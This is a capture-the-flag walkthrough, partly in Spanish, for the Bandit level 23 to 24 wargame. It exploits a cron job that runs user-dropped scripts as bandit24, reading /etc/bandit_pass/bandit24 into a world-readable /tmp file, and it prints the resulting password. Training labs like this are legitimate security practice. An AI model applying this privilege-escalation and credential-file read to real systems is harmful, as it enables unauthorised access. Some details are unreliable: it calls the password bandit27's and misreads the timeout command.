## Level Goal

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Commands you may need to solve this level

chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)

# Solution
Primero vemos que es lo que esta haciendo la tarea cron:
```sh
bandit23@bandit:~$ cd /etc/cron.d

bandit23@bandit:/etc/cron.d$ ls -l
total 24
-rw-r--r-- 1 root root 120 Jul 17 15:57 cronjob_bandit22
-rw-r--r-- 1 root root 122 Jul 17 15:57 cronjob_bandit23
-rw-r--r-- 1 root root 120 Jul 17 15:57 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8 14:38 e2scrub_all
-rwx------ 1 root root  52 Jul 17 15:59 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
## LEEMOS TAREA CRON
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

## LEEMOS EL SCRIPT QUE EJECUTA CADA MINUTO
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

Este script ejecuta todos los scripts creados por bandit23 (propietario:bandit23) si este script tiene permisos de ejecución para otros (ojo). Da un tiempo de ejecución entre 9 a 60 segundos para evitar problemas de loops infinitos o errores y borra el archivo.

#### Pregunta: Si lo ejecuta bandit24, tendre acceso a bandit24
Ejemplo práctico con **whoami**:
Si creamos un script que nos diga el usuario
```sh
#!/bin/bash

echo "$(whoami)">/tmp/tmp.O0Y51DcGYw/file_name
chmod o+r /tmp/tmp.O0Y51DcGYw/file_name
```
El resultado es tener un archivo que sea:
```sh
# COPIAMOS EL SCRIPT AL DIRECTORIO QUE EJECUTA LOS SCRIPTS
bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ cp script.sh /var/spool/bandit24/foo/
bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ watch -n 1 ls -l
bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ cat file_name
bandit24
```
Con el siguiente script nos copiaremos la password de bandit27:
```sh
#!/bin/bash

cat /etc/bandit_pass/bandit24>/tmp/tmp.O0Y51DcGYw/pass_24.log
chmod o+r /tmp/tmp.O0Y51DcGYw/pass_24.log
```
Y el resultado es:
```sh
bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ cp script.sh /var/spool/bandit24/foo/
bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ watch -n 1 ls -l
bandit23@bandit:/tmp/tmp.O0Y51DcGYw$ cat pass_24.log 
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

# Password next level:

gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

## Next level:
[[Level 24 -> 25]]